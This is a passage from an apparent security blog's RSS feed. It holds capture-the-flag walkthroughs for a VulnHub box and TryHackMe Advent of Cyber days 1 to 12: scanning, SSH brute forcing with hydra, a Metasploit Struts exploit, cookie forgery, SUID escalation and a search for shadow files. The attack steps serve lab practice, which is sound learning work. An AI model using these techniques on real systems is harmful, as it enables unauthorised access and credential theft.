&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This shows us that there are 3 users with shell access
&lt;em&gt;RickSanchez,Summer,Morty&lt;/em&gt;
And the password &lt;strong&gt;winter&lt;/strong&gt; would most likely be the password for user &lt;em&gt;Summer&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bingo!
We got another flag&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-4&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{Get off the high road Summer} - 10 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=40/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Checking out other users’ files 
For Morty we have a jpeg image and zip file 
The zip is password protected my best guess was that the password was hidden in the jpg file since strings was not installed in the system I had to use the head command and I got the password as &lt;strong&gt;&lt;em&gt;Meeseek&lt;/em&gt;&lt;/strong&gt;
and there was another flag for us&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-5&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{131333} - 20 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=60/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now it was time for &lt;em&gt;RickSanchez&lt;/em&gt;
there was a binary &lt;strong&gt;safe&lt;/strong&gt; in the directory on running I found that the binary needed an argument
based on prev flag I entered &lt;em&gt;131333&lt;/em&gt; as the argument and &lt;strong&gt;&lt;em&gt;BOOM&lt;/em&gt;&lt;/strong&gt; I got another flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-6&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{And Awwaaaaayyyy we Go!} - 20 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=80/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;there was also a hint to RickSanchez’s ssh password 
the band name was &lt;strong&gt;&lt;em&gt;The Flesh Curtains&lt;/em&gt;&lt;/strong&gt;(Found it on Google FYI:Not a RickNMorty Fan)
Now lets generate the bruteforce password list I used crunch&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After generating the wordlist i let it run with hydra and yup i got the pass&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the pass was &lt;strong&gt;P7Curtains&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;On logging in I checked for root privileges 
and elevated to root easily and read the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-7&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{Ionic Defibrilator} - 30 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=110/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now lets focus on remaining open ports 
On checking out 9090 
it directly gave us the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-8&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{THERE IS NO ZEUS,IN YOUR FACE!} - 10 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=120/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;And now the last port unchecked was 60000 on connecting to it using netcat gave us some kind of shell and i read the flag no worries&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/vuln_rid-easy/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;flag-9&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG{Flip the pickle Morty!} - 10 points
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;points=130/130&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Yep this was a great box for me as I completed it within a day despite it being my first box as I had read writup about other boxes previouly it helped me a lot&lt;/p&gt;

&lt;p&gt;&lt;em&gt;BYE!!&lt;/em&gt;&lt;/p&gt;
</description>
                <pubDate>Fri, 06 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Vulnhub-Ridiculously-Easy</link>
                <guid isPermaLink="true">http://localhost:8000/Vulnhub-Ridiculously-Easy</guid>
                
                <category>Vulnhub</category>
                
                <category>boot2root</category>
                
                
            </item>
        
            <item>
                <title>Try Hackme Advent of Cyber Day7 to Day12 Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;So this is the continuation to the Advent_of_Cyber 25 part Series on &lt;a href=&quot;https://tryhackme.com&quot;&gt;https://tryhackme.com&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;day7task-12&quot;&gt;Day7(Task 12)&lt;/h2&gt;
&lt;p&gt;here we have to do a nmap scan on the given ip and answer some question based on the scan results &lt;strong&gt;So_Ezzzz&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I used the following command&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;  10.10.231.143
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;some part of the log results are given below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we see a http server on port &lt;strong&gt;999&lt;/strong&gt;
we access it on our browser to get the answer to the last question&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day8task-13&quot;&gt;Day8(Task 13)&lt;/h2&gt;
&lt;p&gt;So I have to find the port on which ssh is running on so I use the following command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-parallelism&lt;/span&gt; 100  10.10.159.75
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;we get the port 65534 open and further scan reveals that it is running ssh&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets ssh into it 
we now use the following command to find &lt;strong&gt;SUID&lt;/strong&gt; file with user root as the name of the challenge suggest 
we use the command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-print&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;images/thm_advent/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now the system-control binary looks interesting,on checking it out we find that it executes any command we supply as root so we can get both the flags using this binary&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;hackerman!!!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;day9task-14&quot;&gt;Day9(Task 14)&lt;/h2&gt;
&lt;p&gt;This is a simple scripting task we just have to write a script to find the &lt;strong&gt;value&lt;/strong&gt; by using &lt;em&gt;requests&lt;/em&gt; and &lt;em&gt;json&lt;/em&gt; module in python&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;f&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.241.214:3000/&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;# print(response.text)
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;json_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;next&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;# print(value)
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;On running the script we get the flag&lt;/p&gt;

&lt;h2 id=&quot;day10task-15&quot;&gt;Day10(Task 15)&lt;/h2&gt;

&lt;p&gt;So this is basically intro to the metasploit framework&lt;/p&gt;

&lt;p&gt;lets start by basic nmap scans&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now running nikto to find the vulnerablity in the web server&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so we got a strut vulnerablity from nikto lets search for it in msfconsole&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;configuring the exploit in the msfconsole and running it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now finding the flag using basic regex&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and ssh pass from bash_history&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now logging into ssh using the credentials and finding the asked info&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day11task-16&quot;&gt;Day11(Task 16)&lt;/h2&gt;
&lt;p&gt;This Challenge introduces us to the basic file transfer and database service
First of lets nmap scan the ip&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;task-1&quot;&gt;Task 1&lt;/h3&gt;
&lt;p&gt;Here we have to read creds.txt from nfs of the server&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;task-2&quot;&gt;Task 2&lt;/h3&gt;
&lt;p&gt;Here we login using creds as &lt;strong&gt;anonymous:anonymous&lt;/strong&gt;
and get the desired file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;task-3&quot;&gt;Task 3&lt;/h3&gt;
&lt;p&gt;Now login in to mysql database using the credentials found and look for useful data&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The task is Done &lt;em&gt;:)))&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;day12task-17&quot;&gt;Day12(Task 17)&lt;/h2&gt;

&lt;p&gt;So in this challenge we are given a zip file, on unzipping it we find the following&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-1&quot;&gt;ques 1&lt;/h3&gt;
&lt;p&gt;we need to find the md5sum of note1 file which can be done easily in the terminal :smile:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-2&quot;&gt;ques 2&lt;/h3&gt;
&lt;p&gt;we need to decrypt the gpg file and we are given the passphrase as &lt;strong&gt;25daysofchristmas&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-3&quot;&gt;ques 3&lt;/h3&gt;
&lt;p&gt;we need to decrypt an encrypted text file using the given private rsa key 
here google comes to my rescue we need to use &lt;em&gt;openssl rsautl&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Thu, 05 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day7_to_Day12</link>
                <guid isPermaLink="true">http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day7_to_Day12</guid>
                
                <category>TryHackMe</category>
                
                <category>Advent_Of_Cyber</category>
                
                
            </item>
        
            <item>
                <title>Try Hackme Advent of Cyber Day1 to Day6 Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;So this is a website where you can get man challenges and box that you can root to improve your knowledge.
Today I am going to solve the Advent_Of_Cyber  the 25 days challenge for complete beginners
The link is given below
&lt;a href=&quot;https://tryhackme.com/dashboard&quot;&gt;https://tryhackme.com/dashboard&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;day-1task-6&quot;&gt;Day 1(Task 6)&lt;/h2&gt;
&lt;p&gt;So we are given with a login website and we have to register on it using any credentials you want&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After loggin in we have the following screen inspecting the cookies on the website we have the following results&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we have an cookie &lt;strong&gt;authid&lt;/strong&gt; and it seems to be urlencoded and base64 encoded&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On decoding it we have authid=&lt;strong&gt;ghi##########&lt;/strong&gt; 
here the hidden part show the constant part of cookie&lt;/p&gt;

&lt;p&gt;so now we change the user to mcinventory and forge the cookie and inject it into the browser 
authid=&lt;em&gt;mcinventory##########&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so now we have the answers for Task 6&lt;/p&gt;

&lt;h2 id=&quot;day2task-7&quot;&gt;Day2(Task 7)&lt;/h2&gt;

&lt;p&gt;Now we are give a url and we have to find the hidden directries at the given url 
using gobuster for the job&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&amp;lt;ur-machine-ip&amp;gt;:3000 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirb/common.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now on to the directory we get a admin login page 
looking at the source we have&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;searching for the repository on github&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now entering the default creds&lt;/p&gt;

&lt;p&gt;And We have successfully completed the task :)&lt;/p&gt;

&lt;h2 id=&quot;day3task-8&quot;&gt;Day3(Task 8)&lt;/h2&gt;
&lt;p&gt;This is a forensics challenge we have to basically just answer the questions on the site by looking at the pcap file&lt;/p&gt;
&lt;h3 id=&quot;for-ques-1&quot;&gt;For ques 1&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;###for ques 2&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;###for ques 3
we have to save the hash found in the output above and crack the hash with hashcat using rockyou.txt as given in the hint&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One more Day complete :)&lt;/p&gt;

&lt;h2 id=&quot;day4task-9&quot;&gt;Day4(Task 9)&lt;/h2&gt;

&lt;p&gt;This task is about basic understanding of linux and moving around in linux&lt;/p&gt;

&lt;h3 id=&quot;ques-1&quot;&gt;ques 1&lt;/h3&gt;
&lt;p&gt;to see number of visible files  &lt;strong&gt;serioulsy :(&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-2&quot;&gt;ques 2&lt;/h3&gt;
&lt;p&gt;use cat to see the contest &lt;em&gt;EzPz&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-3&quot;&gt;ques 3&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;using the command about the grep &lt;em&gt;recursively&lt;/em&gt;
this help us save time rather that perform grep on each file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-4&quot;&gt;ques 4&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;here using a regex string we can easily carve out the IP address&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-5&quot;&gt;ques 5&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd |grep /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;using this we can see how many users have shell access to the machine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-6&quot;&gt;ques 6&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sha1sum &lt;/span&gt;file8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;using the &lt;strong&gt;sha1sum&lt;/strong&gt; command to get the hash&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-7&quot;&gt;ques 7&lt;/h3&gt;
&lt;p&gt;Since we don’t have permissions to read /etc/shadow file 
so we find other files having string shadow in it and to which we have permission to read&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*shadow*&quot;&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we get an interesting shadow.bak file which we can so reading it we find the mcsysadmin’s password hash&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day5task-10&quot;&gt;Day5(Task 10)&lt;/h2&gt;
&lt;p&gt;This is standard &lt;strong&gt;OSINT&lt;/strong&gt; introductory challenge&lt;/p&gt;

&lt;p&gt;we are given with an jpeg image running exiftool on it gets us the username as the creator tag in exiftool output&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now using any osint username finder try to find the link to username accounts&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got the username&lt;/p&gt;

&lt;p&gt;Lets checkout the twitter account with the found username&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get the answers to the first three questions :)&lt;/p&gt;

&lt;p&gt;now lets go to the wordpress site linked in the description&lt;/p&gt;

&lt;p&gt;There was a mention of wayback machine in the hints section lets look at the results of wayback machine&lt;/p&gt;

